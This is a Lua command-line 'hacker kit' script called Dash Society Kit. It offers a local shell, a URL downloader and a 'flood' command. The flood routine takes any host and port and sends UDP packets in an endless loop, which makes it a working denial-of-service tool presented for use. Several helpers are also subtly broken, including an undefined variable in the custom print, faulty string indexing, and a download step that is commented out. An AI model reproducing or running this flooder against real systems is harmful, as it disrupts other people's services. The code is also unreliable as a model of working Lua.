
-- Dash Society is a client for any operating system
-- that has LUA 5.2 installed.

-- Author: Dashie
-- Version: 1.0


function clear()
    if get_os() == "Linux" then
        os.execute("clear")
    else
        os.execute("cls")
    end
end
function last_index(str, del)
    local key_id = 1;
    local arr = {}

    for t in string.gmatch(str, '([^'..del..']+)') do
        local skey=1
        arr[skey]=t
        skey=skey..1
        key_id=skey
    end

    return arr[key_id]
end
function print(message, mode)
    if mode == "info" then
        mode = "(info): "
    elseif command == "error" then
        mode = "(error): "
    end

    io.write(mode .. message .. "\n")
end
function get_os()
    if package.config:sub(1, 1) == "\\" then
        return "Windows"
    else
        return "Linux"
    end
end
function flood()
    local host, port, bytes

    io.write("(Host)> ")
    host = io.read()
    io.write("(Port)> ")
    port = io.read()
    io.write("(Bytes)> ")
    bytes = io.read()

    print("Generating data ....", "info")

    local data = bytes;

    for k = 0, bytes - 1 do
        data = data .. bytes
    end

    print("Generated data!", "info")

    local sock = require("socket")

    print("Poisoning target ....", "info")

    while true do
        local cl = assert(sock.udp())

        cl:settimeout(0)

        assert(cl:setpeername(host, port))
        assert(cl:send(data))

        cl:close()
    end
end
function shell()
    print("A session has been summoned!", "info")
    print("Type \'!bye\' at any time to quit.", "info")

    while true
    do
        io.write("(shell> ")

        local c = io.read()

        if c == "!bye" then break end

        os.execute(c)
    end
end
function download()
    print("Type the URL of the file you want", "info")
    print("to download down bellow correctly:", "info")

    io.write("(Url)> ")
    local url = io.read()

    print("Attempting to download " .. url .. " ....", "info")

    local http = require("socket.http")
    local body, code = http.request(url)

    if not body then error(code) end

    --local filename =
    io.write(last_index(url, '/'))
    --local file = assert(io.open('downloads/' .. filename, 'wb'))

    --file:write(body)
    --file:close()

    --print("The file assigned to " .. url .. " has been downloaded!", "info")
    --print("You can find the file in downloads/" .. filename .. " !", "info")
end
function cmd(command)
    if command == "cls" then clear() -- Clear Screen

    elseif command == "durl" then download() -- Download by Url
    elseif command == "flood" then flood() -- Network Flood
    elseif command == "sh" then shell() -- Interactive Shell
    elseif command == "reset" then main() -- Script Reset

    else print("Command not recognized.", "error") end
end


function main()
    cmd("cls")

    print("Welcome to Dash Society Kit 1.0 !", "info")
    print("Type \'?\' for help.", "info")

    while true do
        io.write("(Dash Society)> ")
        cmd(io.read())
    end
end


main()
